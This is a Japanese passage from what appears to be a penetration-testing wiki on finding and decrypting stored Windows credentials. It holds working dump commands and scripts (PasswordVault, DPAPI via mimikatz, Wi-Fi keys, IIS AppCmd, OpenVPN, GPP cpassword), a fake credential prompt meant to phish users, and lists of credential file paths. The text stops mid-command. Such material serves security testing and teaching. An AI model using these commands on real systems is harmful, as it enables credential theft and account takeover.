ユーザーのアクティブなセッション内で次の PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にダンプして復号できます。

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** はデータを対称暗号化する方法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化では、ユーザーまたはシステムのシークレットを利用してエントロピーを大幅に高めます。

**DPAPI は、ユーザーのログインシークレットから導出される対称鍵を使って鍵を暗号化します**。システム暗号化の場合は、システムのドメイン認証シークレットを使用します。

DPAPI を使用して暗号化されたユーザーの RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**同じファイル内でユーザーの秘密鍵を保護するマスターキーとともに保存される DPAPI キー**は、通常、64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます。）

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** の `dpapi::masterkey` を使うと復号できます。

**master password で保護された credentials files** は通常、次の場所にあります。

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

適切な `/masterkey` を指定して **mimikatz module** の `dpapi::cred` を使うと、復号できます。\
（root 権限があれば）`sekurlsa::dpapi` module を使って、**memory** から多数の **DPAPI** **masterkeys** を **extract** できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された credentials を手軽に保存する方法として、**scripting** や自動化タスクでよく使用されます。credentials は **DPAPI** で保護されるため、通常は作成時と同じコンピューター上の同じユーザーでしか復号できません。

エクスポートされた credential のファイル名や `.xml` のパスは任意です。スクリプトやファイルの一覧からファイルを見つけた場合は、`C:\Users` にあると決めつけず、対象アカウントの実際のプロファイルディレクトリを確認してください: [Windows can place profiles elsewhere](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルを読み取れることは手掛かりにすぎません。[Windows `Export-Clixml` binds an encrypted credential to the exporting user and computer](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、回収したアカウントが対象サービスに対する有効な権限を持つかどうかは、別途確認する必要があります。通常の列挙では、暗号化された値や平文の値を出力せず、まずパスと ACL を調べてください。

ファイルに含まれる PS credentials を**復号**するには、次のようにします。:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存されたRDP接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers` にあります。

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

適切な `/masterkey` を指定して Mimikatz の `dpapi::rdg` module を使い、**.rdg ファイルを復号**します。\
Mimikatz の `sekurlsa::dpapi` module を使うと、メモリから**多数の DPAPI masterkey を抽出**できます。

**mRemoteNG は異なる接続ストアを使用します。** `%APPDATA%\mRemoteNG` とユーザーの Documents にある読み取り可能な XML を調べます。`config.xml` のような一般的な名前のファイルも対象です。XML ファイルを認証情報の手掛かりとして扱う前に、接続スキーマと暗号化された `Password` 属性を特定してください。保存値は DPAPI/RDCMan のパスワードではありません。復元できるかどうかは、ファイルの暗号化設定とカスタム master password が使用されたかどうかによります。広範な列挙では、暗号化された値を出力しないでください。

**Remote Desktop Plus の profile export** も、ユーザーディレクトリや共有管理フォルダーから読み取れる場合があります。従来形式の `profiles.xml` export には、`ProfileName`、`Password`、`Secure` 要素を含む `Data/Profile` エントリがあります。空でない password 要素は、出力したり平文だと決めつけたりせず、認証情報の手掛かりとして扱ってください。[vendor notes](https://www.donkz.nl/) によると、profile の保護は作成時のアカウントとコンピューターに紐付けることも、より緩い設定にすることもできます。これを利用する前に、ファイルの出所と復元条件を確認してください。

### Sticky Notes

付箋アプリケーションにパスワードなどの情報を保存している人もいます。Microsoft のパッケージ版 Sticky Notes アプリは、通常、ノートを `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` に保存します。古いアプリや別のアプリでは、LevelDB など、異なるユーザープロファイル内のストアを使用する場合があります。SQLite ファイルが見つからない場合にノートが存在しないと判断する前に、インストールされているアプリとストレージ形式を特定してください。

Sticky Notes が SQLite write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、最近 commit されたノートが含まれないことがあります。データベースの整合性が保たれたコピーとともに、対応する `plum.sqlite-wal` を保持してください。利用可能であれば `plum.sqlite-shm` も含めてください。共有メモリの index は再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite's WAL documentation](https://www.sqlite.org/wal.html) を参照してください。アカウント名やパスワードを含むノートは、認証情報の手掛かりにすぎません。アカウント、許可されたアクセス権、パスワードの再利用状況は別途確認してください。暗号化された password-manager のレコードから上位権限のログインを確認するには、実際の復号キーとアプリケーション固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator 権限が必要で、High Integrity level で実行する必要があります。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、一部の**認証情報**が設定されており、**復元**できる可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出したものです：

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認してください。\
インストーラーは **SYSTEM 権限で実行されます。多くの場合、**DLL Sideloading** に対して脆弱です（情報提供元:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## ファイルとレジストリ（認証情報）

### サポートツールのレジストリに残る認証情報の痕跡

古いリモートサポートソフトウェアのインストール環境では、固定されたアプリケーションのレジストリキーに、パスワード関連の値名が残っている場合があります。たとえば、[ベンダーのレジストリキーに関する説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、TeamViewer のバージョン 9 より前では、`SecurityPasswordAES` は設定済みの静的セッションパスワードを示していました。値名のマーカーは確認の手がかりにすぎません。その認証情報を評価する前に、インストールされているバージョン、読み取り可能な値データ、形式、現在の認証動作を確認してください。リモートサポートのパスワードをより権限の高い Windows アカウントで使うには、実際にパスワードが再利用されており、そのアカウントへのアクセスが許可されている必要があります。通常の列挙出力には、暗号文や復元したパスワードを含めないでください。

### 保護されたシートを含む共有スプレッドシート

読み取り可能な共有ブックにアカウント情報が含まれている可能性がある場合は、**ファイルの暗号化**と、ワークシートの保護や非表示列を区別してください。[Microsoft によると](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)、ワークシートの保護は編集を制限するものであり、セキュリティ機能ではありません。それだけでは、ブックの内容が暗号化されているとは言えません。許可された、関連性のあるファイルのみを確認し、広範な列挙中に候補となる秘密情報を表示しないでください。読み取り可能な `.xlsx` のパス、保護されたシート、または非表示列だけでは、認証情報の存在も、いずれかのアカウントがより高い権限を持つことも証明できません。実際のデータと現在のアカウント権限は、それぞれ別途確認してください。

### CI サーバーに残る変更パッチ

CI サーバーは、ビルドの完了後も、送信されたソース変更をデータディレクトリに保持している場合があります。[TeamCity のドキュメント](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes` は remote-run の変更を保存する場所とされています。データディレクトリは設定可能であり、必ずしも `ProgramData` 配下にあるとは限りません。読み取り可能なパッチには、削除または追加された認証情報ファイル、暗号化キー、あるいは両方を使用するスクリプトへの参照が残っていることがあります。たとえば、PowerShell の `ConvertTo-SecureString -Key` を使う処理では、暗号化された文字列だけでなく AES キーも必要です。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)によると、キーは別途指定します。まずアクセス可能なパッチ名だけを確認し、その後、許可を得たうえで関連する内容を調べてください。通常の列挙出力に秘密情報を表示しないでください。パッチのパス、暗号化された値、またはキーへの参照だけでは、有効な認証情報や、より高い権限でのアクセスを証明できません。データディレクトリの ACL を制限し、ビルド変更に秘密情報をコミットしないでください。

### カスタムのローカル管理者パスワードローテーション

独自に作成したパスワードローテーションツールは、暗号化されたローカル管理者パスワードをローカルサービスに保存しつつ、データストアの認証情報を読み取り可能な `.env` ファイルやアップデーターのバイナリの隣に保存している場合があります。アップデーターのスケジュールされたタスク、アカウント、設定ファイルの ACL、リスナー、データストアの権限をあわせて確認してください。ループバック限定のデータストアでも、有効な認証情報を持つローカルユーザーから到達できますが、認証に成功しただけでは、関連レコードの読み取り権限があるとは限りません。暗号化のシードやキー素材が暗号文の隣から取得できる場合は、その暗号化を信頼する前に、実際の鍵導出処理を確認してください。公開されたシードから Go の [`math/rand`](https://pkg.go.dev/math/rand) を使って AES キーを決定論的に導出する方式は、そのパスワードの保護には不適切です。Go のドキュメントでも、このパッケージはセキュリティが重要な乱数生成には適さないとされています。復元したパスワードを権限昇格経路として扱う前に、そのパスワードが現在も有効であり、ローカル Administrators グループのアカウントに属することを確認してください。スケジュールされたタスク、`.env` のパス、または暗号化されたデータだけでは、これらの条件を証明できません。通常の列挙出力にパスワードやキー素材を含めないでください。

管理対象のローカル管理者パスワードには [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) を使用してください。ディレクトリまたは Entra を利用した保存先とアクセス制御は、カスタムのローカルデータストアとは異なります。同様に、[Elasticsearch のロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)は、認証済みのデータストアユーザーが特定のインデックスを読み取れるかどうかを決定します。

### Java サーバーのプラグインアーカイブと認証情報の再利用

Java サーバーのプラグインは、サーバーの `plugins` ディレクトリに JAR アーカイブとして配布される場合があります。読み取り可能なカスタムプラグインに、サービス認証情報を埋め込んだ設定やバイトコードが含まれていることがあります。許可を得た場合に限りアーカイブを確認し、復元した秘密情報を通常の列挙出力に含めないでください。プラグインのパスだけでは秘密情報の存在を証明できず、復元したサービスパスワードによって権限が高まるのは、より権限の高いアカウントでもそのパスワードが有効な場合に限られます。関連ファイルの ACL を確認し、再利用された認証情報は個別の秘密情報に置き換えてください。ディレクトリ構成については [PaperMC のプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)、アーカイブの内容については [Oracle の JAR ドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfire の組み込みデータベース認証情報

組み込みデータベースを使う Openfire のインストール環境では、`openfire.script` が `Openfire\embedded-db` に保存されている場合があります。現在のアカウントが読み取れる場合は、`OFUSER` レコードと `passwordKey` プロパティをあわせて確認してください。Openfire の[ユーザープロバイダーのドキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードはプレーンテキストで保存するか、そのプロパティに保持されたキーで暗号化できます。復元したパスワードが権限昇格に関係するのは、より権限の高い ID に対して現在も有効な場合に限られます。ファイル名だけでは、読み取りアクセスも認証情報の再利用も証明できません。このパスはインベントリ確認の手がかりです。通常の列挙出力にデータベースの内容や認証情報を含めないでください。

別の `Openfire\conf\openfire.xml` ファイルからは、外部データベースを使用している場合でも、管理コンソールの設定ポートやバインドインターフェースが分かることがあります。Openfire は通常、管理コンソールをループバックにバインドしますが、リスナーが稼働中ならローカルアカウントからそのアドレスに接続できます。実際のリスナー、許可された admin ロール、プラグインのアップロードポリシー、Openfire サービスの実行 ID をあわせて確認してください。プラグインをインストールできる admin は、サービスのコンテキストでプラグインコードを実行させられる場合があります。サービスが LocalSystem として実行されている場合、その権限は非常に高い可能性があります。一致するアカウントパスワードや読み取り可能な設定パスだけでは、管理コンソールへのアクセスやコード実行を証明できません。ベンダーの[インストールおよびプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[プラグインアップロード API プロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの設定

一般に `server.config.yaml` という名前の Velociraptor サーバー設定には、内部 CA の `CA.private_key` が含まれている場合があります。権限の低いユーザーがそのキーを読み取れる場合、API クライアント証明書を発行できる可能性があります。これによって権限が高まるかどうかは、サーバーのユーザーロール、API への到達性、サーバーまたは対象エージェントの実行 ID によって異なります。クライアント設定には別の情報が含まれます。クライアント設定が見つかっても、サーバー CA にアクセスできるとは限りません。CA 秘密鍵をオフラインで保管するデプロイ環境もあるため、読み取り可能なサーバー設定にも署名用キーが含まれていないことがあります。

Windows サーバーでは、インストールディレクトリにある**サーバー**設定と、保護されたバックアップコピーの ACL を確認してください。場所の例は `%ProgramFiles%\VelociraptorServer\server.config.yaml` です。場所が異なる場合は、サービスに設定されているパスを使用してください。現在の ID でファイルを読み取れること、および `CA.private_key` が実際に含まれていることを確認してください。ログや列挙出力に秘密鍵を表示しないでください。ベンダーの `config api_client` ワークフローでは、CA キーを使ってクライアント証明書を発行しますが、有効なサーバー側ロールも必要です。ロールの作成や変更には、データストアへの書き込み権限や再起動が必要な場合があります。こうした書き込みができない場合でも、既存の特権付きサーバー ID が経路になることがあります。実行権限を持つ API クエリは、関連するサーバーまたはエージェントのコンテキストで実行されるため、非常に高い権限を持つ場合があります。

サーバー設定とバックアップは制限的な ACL で保護し、可能であれば CA 署名キーをオフラインに保管し、API ロールとリスナーへのアクセスを制限してください。[Velociraptor API ドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)と[セキュリティ設定のガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTYは独立したセッションマネージャーです。ネイティブの暗号化ストアは`%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`にある場合があり、エクスポートされたセッションのバックアップは`sessions-backup.dat`という名前で別の場所に保存されている場合があります。[SolarWindsのエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートはパスワードで暗号化され、セッション、キー、スクリプト、タグ、関連情報が含まれることがあります。[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)には、ネイティブストアの場所が示されています。まずファイルの権限とパスを確認してください。いずれかのファイルを見つけても、パスワードが判明するわけではなく、保存された認証情報が現在も有効であることや、より高い権限を持つことの証明にもなりません。

### PuTTY SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されていることがあるため、その中に興味深いものがないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリが見つかった場合、おそらく保存された SSH key です。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この technique の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service が実行されておらず、起動時に自動で開始したい場合は、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この手法はもう有効ではないようです。ssh keyをいくつか作成し、`ssh-add`で追加して、ssh経由でマシンにログインしようとしました。レジストリのHKCU\Software\OpenSSH\Agent\Keysは存在せず、公開鍵認証中に`dpapi.dll`が使用されていることもprocmonでは確認できませんでした。

### 無人インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

これらのファイルは、**metasploit** を使って検索することもできます: _post/windows/gather/enum_unattend_

内容の例:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging（`.wim`）バックアップファイルには、オフラインの `SAM`、`SECURITY`、`SYSTEM` ハイブが含まれている場合もあります。ローカルからアクセス可能なバックアップやイメージのディレクトリを優先し、何かを抽出する前にイメージの**メンバー名**を確認してください。`.wim` というファイル名だけではハイブが露出している証拠にはならず、一般的な `install.wim`、`boot.wim`、およびリカバリーイメージは、誤検知につながることがよくあります。SMB share は別のアクセス経路であり、その share が対象範囲に含まれる場合にのみ確認してください。Microsoft の [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) と [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml**というファイルを検索します。

### キャッシュされた GPP パスワード

以前は、Group Policy Preferences (GPP) を使って、複数のマシンにカスタムのローカル administrator アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存される Group Policy Objects (GPO) は、すべてのドメインユーザーがアクセスできました。次に、GPP 内のパスワードは、公開済みのデフォルトキーを使って AES256 で暗号化されていましたが、認証済みユーザーであれば誰でも復号できました。これにより、ユーザーが昇格した権限を取得するおそれがありました。

このリスクを軽減するため、空ではない「cpassword」フィールドを含む、ローカルにキャッシュされた GPP ファイルを検索する関数が開発されました。そのようなファイルが見つかると、関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには、GPP の詳細とファイルの場所が含まれており、このセキュリティ上の脆弱性の特定と修正に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista より前)_ で、次のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexecを使用してパスワードを取得する:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

公開されている webroot に直接置かれた古い ZIP バックアップから、過去の設定ファイルや再利用可能な認証情報が漏れる可能性があります。露出と判断する前に、サイトに設定された物理パスを確認し、アーカイブに HTTP 経由で実際にアクセスできるかを確かめてください。デフォルトの `C:\inetpub\wwwroot` は候補にすぎません。簡単なローカルインベントリなら、アーカイブを開かずに名前とサイズを一覧表示できます。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブ名だけでは、秘密情報が含まれていることも、復元した認証情報によってより高い権限を得られることも証明できません。

### OpenVPN 認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

ユーザーが知っていると思われる場合は、**ユーザー自身の認証情報、あるいは別のユーザーの認証情報を入力するよう、いつでも尋ねることができます**（クライアントに**認証情報**を直接**尋ねる**のは非常に**危険**であることに注意してください）。

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていたことが知られているファイル

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 のデータベースでは、一般に `.psafe3` 拡張子が使われます。一致するファイル名は、暗号化された vault の候補として扱ってください。そのファイルが存在しても、読み取りやロック解除ができること、または保存された認証情報を使用できることの証明にはなりません。こうしたファイルの保存場所を確認する際は、アクセス可能なユーザープロファイルと、設定済みのファイル共有ルートを調べてください。

読み取り可能な KeePass `.kdbx` も、暗号化された vault の手掛かりにすぎません。ロック解除には、実際のマスターパスワードに加え、設定されているキーファイルやアカウント要素が必要です。許可された調査でエントリに LM:NT ハッシュのペアが見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントを確認し、NT ハッシュが最新で、対象の NTLM サービスで受け入れられるかを検証してください。vault のエントリだけでは、Administrator または SYSTEM 権限は得られません。リモートサービスへのアクセス、アカウント権限、および別途必要なサービス実行の手順も満たす必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報を出力しないでください。

以下のファイルをすべて検索してください:

```
cd C:\
